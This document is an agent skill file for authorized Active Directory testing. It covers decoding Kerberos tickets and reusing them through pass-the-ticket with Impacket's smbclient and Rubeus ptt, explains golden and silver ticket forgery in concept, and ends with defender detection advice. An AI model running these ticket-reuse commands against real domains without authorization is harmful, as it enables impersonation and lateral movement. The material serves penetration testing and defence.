---
name: ticket-analysis
description: Use when you hold Kerberos tickets on an authorized AD
  engagement and need to read, validate, and reuse them. Covers ticket
  decoding, expiry and flag review, pass-the-ticket with Impacket and
  Rubeus, and ticket forgery concepts for the report. Use when you
  extracted tickets from memory or requests, when the password is unknown
  but the ticket works, or when assessing ticket lifetime and delegation
  risks.
version: 1.0.0
domain: ad
lifecycle: stable
last_verified: 2026-10-23
parent: kerberoasting
requires: [kerberoasting]
extends: []
relates: [ad-enumeration, memory-forensics]
tools:
  - name: Impacket
    version: 0.11.0
  - name: PowerShell
    version: 7.4
  - name: Python
    version: 3.12
---

A Kerberos ticket is authentication without the password: whoever holds a
valid service ticket or ticket-granting ticket acts as that user until it
expires. This skill covers working with captured tickets on authorized
engagements: decoding them to see what they grant, reusing them
(pass-the-ticket), and understanding the forgery techniques for the
report. Tickets come from memory dumps, roasting, or delegation abuse;
this sub-skill starts where those end.

## Quick Workflow

1. Inventory the tickets you hold: type (TGT or service), user, expiry.
2. Decode each ticket and review its flags and lifetime.
3. Test the ticket with a read-only authenticated action.
4. Reuse valid tickets for the engagement's objectives (pass-the-ticket).
5. Note delegation flags and weak encryption as separate findings.
6. Record ticket lifetimes and the actions each ticket enabled.

## 1. Decoding tickets

```bash
# Impacket: describe a ticket file (.kirbi or ccache)
python3 /opt/impacket/examples/describeTicket.py /tmp/ticket.kirbi 2>&1 | head -30
# Shows: user, domain, expiry, flags, encryption type

# Convert between formats as tools demand
# kirbi (Rubeus/Mimikatz) <-> ccache (Impacket/Linux)
python3 /opt/impacket/examples/ticketConverter.py /tmp/ticket.kirbi /tmp/ticket.ccache
```

```powershell
# Rubeus: list tickets in the current session
Rubeus.exe triage
# Decode one in detail
Rubeus.exe describe /ticket:<base64blob>
```

Read the expiry first: a ticket valid for 10 hours shapes your whole
session plan. Read the flags next: forwardable and renewable tickets are
more reusable; check the encryption type for RC4 versus AES.

## 2. Pass-the-ticket

```bash
# Impacket: use the ticket without knowing the password
export KRB5CCNAME=/tmp/ticket.ccache
python3 /opt/impacket/examples/smbclient.py -k -no-pass corp.example/sqlservice@10.0.5.20
# -k means Kerberos auth, -no-pass means use the ticket cache

# Read-only proof first: list a share, do not write
# shares> ls
```

```powershell
# Rubeus: inject the ticket into the current session
Rubeus.exe ptt /ticket:<base64blob>
# Then act as the user: klist shows the imported ticket
klist | head -10
```

Pass-the-ticket is quieter than password use (no new authentication
against the KDC for service tickets) and works when the password is
unknown or rotated. Prove access with a read, then proceed to objectives.

## 3. Forgery concepts for the report

```bash
# Golden ticket: forged TGT with the krbtgt hash (domain compromise level)
# Silver ticket: forged service ticket with the service account hash
# Both need hashes you should only hold with explicit approval

# Check what you would need: krbtgt hash enables golden tickets,
# which is why DCSync is the crown jewel it is
```

Describe forgery accurately in the report without building forgeries you
do not need: a golden ticket grants any access for up to 10 years by
default settings, which is why krbtgt hash disclosure is a
recovery-level event. If the engagement legitimately needs a forged
ticket demonstrated, get explicit approval first.

## Edge cases

- The ticket expired mid-operation. Request or capture fresh tickets;
  factor the lifetime into the op plan from the start.
- The ticket is for the wrong SPN. Service tickets are single-service;
  you need the right ticket per target service.
- Clock skew breaks Kerberos. Keep the attack box within 5 minutes of
  the DC; sync with NTP before blaming the ticket.
- Delegation flags surprise you. Unconstrained delegation on the
  account means its tickets can be abused further; note it as its own
  finding.

## Escalation

- You need a TGT but hold only service tickets: use the service access
  to hunt for the next credential or ticket; do not forge what you
  cannot legitimately get.
- Ticket reuse is blocked by policy: note the control working and move
  to credential-based paths.
- The engagement needs the full ticket attack chain documented: map
  each ticket to the access it granted in the report's attack path
  section.

## Detection and defender view

Defenders see pass-the-ticket as logons without a matching prior
authentication, tickets used from unusual hosts, and RC4 tickets in an
AES environment. Forged tickets show as impossible lifetimes or
anomalous PAC data. Defenses are AES-only Kerberos, short ticket
lifetimes, monitoring for logon anomalies, and treating any krbtgt
compromise as a full forest recovery event (reset the krbtgt password
twice).

## Key references

- MITRE ATT&CK T1550.003 (Use Alternate Authentication Material: Pass
  the Ticket).
- MITRE ATT&CK T1558.001 (Steal or Forge Kerberos Tickets: Golden
  Ticket).
- CWE-287 (Improper Authentication).
- Impacket ticket tools documentation.
